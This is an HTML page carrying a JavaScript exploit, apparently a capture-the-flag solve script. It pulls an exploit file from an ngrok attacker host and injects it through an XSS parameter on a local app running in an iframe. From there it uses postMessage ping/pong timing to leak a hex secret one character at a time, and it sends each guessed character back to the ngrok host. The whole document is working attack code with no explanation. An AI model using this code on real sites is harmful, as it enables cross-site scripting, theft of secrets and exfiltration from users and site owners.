<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <script>

    var flag = "";
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    async function observer() {
      const iframe = document.createElement("iframe");

      let datga = await (await fetch(`https://bcfb-151-45-75-194.ngrok-free.app/expoit.js?sec=${flag}`)).text();

      iframe.src = `http://localhost:3000/xss?xss=<script>${encodeURIComponent(datga)}<\/script>`;

      document.body.appendChild(iframe);

      await new Promise(resolve => {
        iframe.onload = resolve;
      });

      console.log("iframe loaded, sending 'start' message...");
      iframe.contentWindow.postMessage("start", "*");

      await new Promise(resolve => setTimeout(resolve, 1000));

      let lastResponse = null;
      let lastPongTime = Date.now();

      const messageHandler = (event) => {
        if (typeof event.data === "string" && event.data.startsWith("pong")) {
          console.log("Received:", event.data);
          lastResponse = event.data;
          lastPongTime = Date.now();
        }
      };
      window.addEventListener("message", messageHandler);

      return new Promise((resolve) => {
        const pingInterval = setInterval(() => {
          iframe.contentWindow.postMessage("ping", "*");

          if (Date.now() - lastPongTime > 500) {
            clearInterval(pingInterval);
            window.removeEventListener("message", messageHandler);
            console.log("No pong received for 500ms. Returning last response:", lastResponse);
            resolve(lastResponse);
          }
        }, 100);
      });
    }

    let charset = "0123456789abcdef";

    async function main() {
      while (1) {
        const lastResponse = (await observer()).split(" ")[1];
        console.log("GUESS: ", lastResponse);
        console.log(charset[parseInt(lastResponse)]);

        flag += charset[parseInt(lastResponse)];
        fetch("https://bcfb-151-45-75-194.ngrok-free.app/leak?c=" + flag)

        await sleep(1000);
      }

    }

    main();

  </script>
</body>

</html>